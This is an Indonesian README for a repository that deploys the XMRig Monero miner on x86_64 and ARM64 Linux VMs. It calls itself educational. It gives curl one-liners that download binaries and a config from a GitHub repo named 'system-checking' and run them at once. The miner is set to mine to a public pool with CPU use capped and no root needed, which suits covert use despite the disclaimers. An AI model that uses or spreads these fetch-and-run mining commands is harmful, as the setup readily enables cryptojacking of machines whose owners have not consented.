# XMRig Edukasi - Multi Arsitektur (x86_64 & ARM64)

Repo ini berisi setup XMRig untuk pembelajaran di VM pribadi yang authorized.
Dibuat agar bisa berjalan di 2 VM Linux dengan arsitektur berbeda:
- x86_64 (amd64)
- aarch64 (arm64)

**Peringatan:** Gunakan hanya di VM/mesin milik sendiri yang authorized. Jangan jalankan di sistem orang lain tanpa izin tertulis.

---

## Isi Repo

```
.
├── xmrig-x86_64      # Binary resmi XMRig untuk Linux x86_64
├── xmrig-aarch64     # Binary hasil compile untuk Linux ARM64 (build manual)
├── config.json       # Konfigurasi pool, wallet, dan pembatasan CPU
├── run-miner.sh      # Script otomatis deteksi arsitektur + run miner
├── build-arm64.sh    # Script compile XMRig untuk ARM64 di VM ARM64
└── README.md         # Dokumentasi ini
```

---

## Cara Upload ke GitHub

1. Buat repository baru di GitHub (misal: `Loritcz`).
2. Ganti placeholder di `run-miner.sh`:
   ```sh
   REPO_USER="Loritcz"
   REPO_NAME="system-checking"
   ```
3. Upload semua file ke repo:
   ```bash
   git init
   git add .
   git commit -m "Initial xmrig edu setup"
   git branch -M main
   git remote add origin https://github.com/Loritcz/system-checking.git
   git push -u origin main
   ```

---

## Cara Menyiapkan Binary ARM64

XMRig resmi tidak merilis binary Linux ARM64. Jadi untuk VM ARM64, binary harus dibangun sendiri.

**Syarat di VM ARM64 (user biasa):**
- `gcc`, `cmake`, `make` sudah terinstall.
- `libuv1-dev` dan `libssl-dev` sudah terinstall.
- `libhwloc-dev` optional (kalau tidak ada, HWLOC otomatis dimatikan).

Kalau dependency belum terinstall, install sekali dengan root/sudo:

```bash
sudo apt update
sudo apt install -y build-essential cmake libuv1-dev libssl-dev libhwloc-dev git
```

Setelah itu, seluruh proses build berjalan sebagai **user biasa tanpa root**.

### Langkah 1: Jalankan Build Script

Di VM ARM64, jalankan:

```bash
curl -fsSL -o build-arm64.sh https://raw.githubusercontent.com/Loritcz/system-checking/main/build-arm64.sh
chmod +x build-arm64.sh
./build-arm64.sh
```

Script ini akan:
- Clone source XMRig dari GitHub.
- Compile binary ARM64.
- Menyimpan hasil di `~/xmrig-edu/xmrig-aarch64`.

### Langkah 2: Upload Binary ke GitHub (Opsional)

Kalau ingin VM ARM64 lain atau one-liner bisa pakai binary ini, upload `xmrig-aarch64` ke repo GitHub:

```bash
# Di VM ARM64, setelah build selesai
cp ~/xmrig-edu/xmrig-aarch64 /path/ke/repo/windows/xmrig-aarch64
```

Lalu push ke GitHub dari Windows.

---

## Cara Menjalankan di VM (User Biasa)

### Opsi 1: One-Liner (Setup + Run)

Jalankan command ini di VM:

```bash
bash -c 'ARCH=$(uname -m); BIN="xmrig-${ARCH}"; mkdir -p ~/xmrig-edu && cd ~/xmrig-edu && curl -fsSL -o config.json https://raw.githubusercontent.com/Loritcz/system-checking/main/config.json && curl -fsSL -o "$BIN" "https://raw.githubusercontent.com/Loritcz/system-checking/main/$BIN" && chmod +x "$BIN" && ./"$BIN" -c config.json'
```

### Opsi 2: Menggunakan Script `run-miner.sh`

```bash
# Download script
mkdir -p ~/xmrig-edu && cd ~/xmrig-edu
curl -fsSL -o run-miner.sh https://raw.githubusercontent.com/Loritcz/system-checking/main/run-miner.sh
chmod +x run-miner.sh

# Jalankan
./run-miner.sh
```

### Opsi 3: Manual

```bash
mkdir -p ~/xmrig-edu && cd ~/xmrig-edu

# Download config dan binary sesuai arsitektur
curl -fsSL -o config.json https://raw.githubusercontent.com/Loritcz/system-checking/main/config.json

# Untuk x86_64:
curl -fsSL -o xmrig-x86_64 https://raw.githubusercontent.com/Loritcz/system-checking/main/xmrig-x86_64
chmod +x xmrig-x86_64
./xmrig-x86_64 -c config.json

# Untuk ARM64:
curl -fsSL -o xmrig-aarch64 https://raw.githubusercontent.com/Loritcz/system-checking/main/xmrig-aarch64
chmod +x xmrig-aarch64
./xmrig-aarch64 -c config.json
```

---

## Verifikasi

Cek apakah miner berjalan sebagai user biasa:
```bash
ps aux | grep xmrig
```

Lihat log real-time:
```bash
tail -f ~/xmrig-edu/xmrig.log
```

Pastikan proses tidak berjalan sebagai root:
```bash
ps -o user,pid,comm -p $(pgrep xmrig)
```

---

## Konfigurasi

File `config.json` sudah diatur:
- **Pool:** `pool.supportxmr.com:3333`
- **Wallet:** wallet user
- **CPU usage:** dibatasi ~50% (`max-threads-hint: 50`)
- **Huge pages:** dimatikan (butuh root)
- **Logging:** ke `xmrig.log` di folder kerja

Untuk mengganti pool, edit bagian `pools` di `config.json`.

---

## Catatan Keamanan & Etika

- Repo ini untuk edukasi di VM/mesin sendiri.
- Jangan gunakan untuk menambang di sistem tanpa izin.
- Jangan bagikan private key/spend key wallet.
- Binary ARM64 hasil compile sendiri; binary x86_64 dari release resmi XMRig.
